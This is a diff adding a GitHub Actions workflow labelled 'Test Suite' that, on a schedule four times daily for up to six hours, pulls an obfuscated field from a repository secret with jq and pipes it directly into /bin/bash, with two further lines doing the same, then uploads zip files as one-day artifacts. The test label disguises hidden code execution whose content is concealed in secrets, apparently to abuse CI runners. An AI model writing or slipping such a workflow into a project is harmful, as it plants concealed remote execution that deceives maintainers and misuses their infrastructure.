@@ -1,0 +1,30 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          fi163: ${{ secrets.fi163 }}
+        run: |
+          printf '%s' "$fi163" | jq -r .lasse71 | /bin/bash
+          printf '%s' "$rhdl74" | jq -r .l67045 | /bin/bash
+          printf '%s' "$n31658" | jq -r .uh5 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: HM036a4B
+          path: "*.zip"
+          retention-days: 1
